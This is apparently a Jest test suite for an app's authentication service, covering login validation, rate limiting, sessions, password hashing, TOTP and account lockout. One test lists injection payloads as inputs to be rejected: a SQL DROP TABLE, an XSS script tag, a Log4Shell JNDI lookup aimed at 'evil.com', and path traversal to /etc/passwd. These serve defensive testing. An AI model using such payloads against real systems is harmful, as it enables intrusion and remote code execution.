import { authService } from '../../services/authService';
import { secureStorage } from '../../services/secureStorage';
import { validateInput } from '../../utils/validation';

// Mock dependencies
jest.mock('../../services/secureStorage');
jest.mock('../../utils/validation');

const mockSecureStorage = secureStorage as jest.Mocked<typeof secureStorage>;
const mockValidateInput = validateInput as jest.MockedFunction<typeof validateInput>;

describe('Authentication Security', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    mockValidateInput.mockReturnValue({ isValid: true });
  });

  describe('Login Security', () => {
    it('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        'test@',
        '@domain.com',
        'test..test@domain.com',
        'test@domain',
      ];

      for (const email of invalidEmails) {
        mockValidateInput.mockReturnValueOnce({
          isValid: false,
          error: 'Invalid email format',
        });

        const result = await authService.login(email, 'password123');
        
        expect(result.success).toBe(false);
        expect(result.error).toContain('Invalid email');
      }
    });

    it('should enforce password strength requirements', async () => {
      const weakPasswords = [
        '123',
        'password',
        'abc123',
        '12345678',
        'PASSWORD',
        'password123', // no uppercase
        'PASSWORD123', // no lowercase
        'Password', // too short
      ];

      for (const password of weakPasswords) {
        mockValidateInput.mockReturnValueOnce({
          isValid: false,
          error: 'Password does not meet security requirements',
        });

        const result = await authService.login('test@example.com', password);
        
        expect(result.success).toBe(false);
        expect(result.error).toContain('Password does not meet');
      }
    });

    it('should implement rate limiting for failed attempts', async () => {
      const email = 'test@example.com';
      const password = 'wrongpassword';

      // Mock failed login attempts
      for (let i = 0; i < 5; i++) {
        await authService.login(email, password);
      }

      // 6th attempt should be rate limited
      const result = await authService.login(email, password);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Too many failed attempts');
    });

    it('should sanitize input to prevent injection attacks', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'admin\' OR \'1\'=\'1',
      ];

      for (const input of maliciousInputs) {
        mockValidateInput.mockReturnValueOnce({
          isValid: false,
          error: 'Invalid characters detected',
        });

        const result = await authService.login(input, 'password');
        
        expect(result.success).toBe(false);
        expect(mockValidateInput).toHaveBeenCalledWith(input, expect.any(Object));
      }
    });

    it('should securely store authentication tokens', async () => {
      const mockToken = 'jwt.token.here';
      
      mockSecureStorage.store.mockResolvedValue();
      
      await authService.storeAuthToken(mockToken);
      
      expect(mockSecureStorage.store).toHaveBeenCalledWith(
        'auth_token',
        mockToken,
        expect.objectContaining({
          encrypt: true,
          requireBiometric: true,
        })
      );
    });

    it('should handle token expiration securely', async () => {
      const expiredToken = 'expired.jwt.token';
      
      mockSecureStorage.retrieve.mockResolvedValue(expiredToken);
      
      const isValid = await authService.validateToken(expiredToken);
      
      expect(isValid).toBe(false);
      expect(mockSecureStorage.remove).toHaveBeenCalledWith('auth_token');
    });
  });

  describe('Session Management', () => {
    it('should implement secure session timeout', async () => {
      const sessionTimeout = 30 * 60 * 1000; // 30 minutes
      
      // Mock session creation
      const sessionStart = Date.now();
      await authService.createSession('user123', sessionStart);
      
      // Fast forward time
      jest.spyOn(Date, 'now').mockReturnValue(sessionStart + sessionTimeout + 1000);
      
      const isSessionValid = await authService.validateSession('user123');
      
      expect(isSessionValid).toBe(false);
    });

    it('should invalidate sessions on logout', async () => {
      const userId = 'user123';
      
      await authService.logout(userId);
      
      expect(mockSecureStorage.remove).toHaveBeenCalledWith('auth_token');
      expect(mockSecureStorage.remove).toHaveBeenCalledWith('refresh_token');
      expect(mockSecureStorage.remove).toHaveBeenCalledWith(`session_${userId}`);
    });

    it('should handle concurrent session limits', async () => {
      const userId = 'user123';
      const maxSessions = 3;
      
      // Create multiple sessions
      for (let i = 0; i < maxSessions + 1; i++) {
        await authService.createSession(userId, Date.now(), `device_${i}`);
      }
      
      // Should only keep the most recent sessions
      const activeSessions = await authService.getActiveSessions(userId);
      expect(activeSessions.length).toBeLessThanOrEqual(maxSessions);
    });
  });

  describe('Password Security', () => {
    it('should hash passwords with salt', async () => {
      const password = 'SecurePassword123!';
      
      const hash1 = await authService.hashPassword(password);
      const hash2 = await authService.hashPassword(password);
      
      // Same password should produce different hashes due to salt
      expect(hash1).not.toBe(hash2);
      expect(hash1.length).toBeGreaterThan(password.length);
    });

    it('should verify password hashes correctly', async () => {
      const password = 'SecurePassword123!';
      const hash = await authService.hashPassword(password);
      
      const isValid = await authService.verifyPassword(password, hash);
      const isInvalid = await authService.verifyPassword('wrongpassword', hash);
      
      expect(isValid).toBe(true);
      expect(isInvalid).toBe(false);
    });

    it('should enforce password history', async () => {
      const userId = 'user123';
      const passwords = [
        'OldPassword1!',
        'OldPassword2!',
        'OldPassword3!',
        'OldPassword1!', // Reusing old password
      ];
      
      for (let i = 0; i < passwords.length - 1; i++) {
        await authService.changePassword(userId, passwords[i]);
      }
      
      // Attempt to reuse old password
      const result = await authService.changePassword(userId, passwords[3]);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('recently used');
    });
  });

  describe('Two-Factor Authentication', () => {
    it('should generate secure TOTP codes', async () => {
      const userId = 'user123';
      
      const secret = await authService.generateTOTPSecret(userId);
      
      expect(secret).toBeDefined();
      expect(secret.length).toBeGreaterThan(16);
      expect(mockSecureStorage.store).toHaveBeenCalledWith(
        `totp_secret_${userId}`,
        secret,
        expect.objectContaining({ encrypt: true })
      );
    });

    it('should validate TOTP codes within time window', async () => {
      const userId = 'user123';
      const secret = 'JBSWY3DPEHPK3PXP';
      
      mockSecureStorage.retrieve.mockResolvedValue(secret);
      
      // Generate current TOTP code
      const currentCode = authService.generateTOTPCode(secret);
      
      const isValid = await authService.validateTOTPCode(userId, currentCode);
      
      expect(isValid).toBe(true);
    });

    it('should prevent TOTP code reuse', async () => {
      const userId = 'user123';
      const code = '123456';
      
      // Use code first time
      await authService.validateTOTPCode(userId, code);
      
      // Attempt to reuse same code
      const result = await authService.validateTOTPCode(userId, code);
      
      expect(result).toBe(false);
    });
  });

  describe('Account Security', () => {
    it('should lock account after failed attempts', async () => {
      const email = 'test@example.com';
      const maxAttempts = 5;
      
      // Simulate failed login attempts
      for (let i = 0; i < maxAttempts; i++) {
        await authService.login(email, 'wrongpassword');
      }
      
      const accountStatus = await authService.getAccountStatus(email);
      
      expect(accountStatus.locked).toBe(true);
      expect(accountStatus.lockExpiry).toBeDefined();
    });

    it('should require email verification for new accounts', async () => {
      const email = 'newuser@example.com';
      const password = 'SecurePassword123!';
      
      const result = await authService.register(email, password);
      
      expect(result.success).toBe(true);
      expect(result.emailVerificationRequired).toBe(true);
      
      // Account should not be fully active until verified
      const loginResult = await authService.login(email, password);
      expect(loginResult.success).toBe(false);
      expect(loginResult.error).toContain('email verification');
    });

    it('should handle password reset securely', async () => {
      const email = 'user@example.com';
      
      const resetResult = await authService.requestPasswordReset(email);
      
      expect(resetResult.success).toBe(true);
      
      // Reset token should be stored securely
      expect(mockSecureStorage.store).toHaveBeenCalledWith(
        expect.stringContaining('reset_token'),
        expect.any(String),
        expect.objectContaining({
          encrypt: true,
          ttl: expect.any(Number),
        })
      );
    });
  });
});